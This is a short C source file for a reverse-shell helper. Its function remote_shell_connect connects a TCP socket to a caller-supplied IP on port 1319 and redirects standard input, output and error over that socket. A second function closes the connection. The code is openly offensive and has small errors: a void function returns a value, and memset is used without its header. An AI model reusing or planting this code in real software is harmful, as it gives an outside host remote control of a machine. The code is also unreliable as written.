#include <assert.h>
#include <stdint.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int fd;

void remote_shell_connect(char * dest_ip){
    fd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in sa_dst;
    memset(&sa_dst, 0, sizeof(struct sockaddr_in));
    sa_dst.sin_family = AF_INET;
    sa_dst.sin_port = htons(1319);
    sa_dst.sin_addr.s_addr = inet_addr(dest_ip);
    //sa_dst.sin_addr.s_addr = inet_addr("127.0.0.1");
    int ret;
    ret = connect(fd, (struct sockaddr *)&sa_dst, sizeof(struct sockaddr));
    assert(ret!=-1);
    // Redirect IO
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    return fd;
}

void remote_shell_stop(int fd){
    close(fd);
}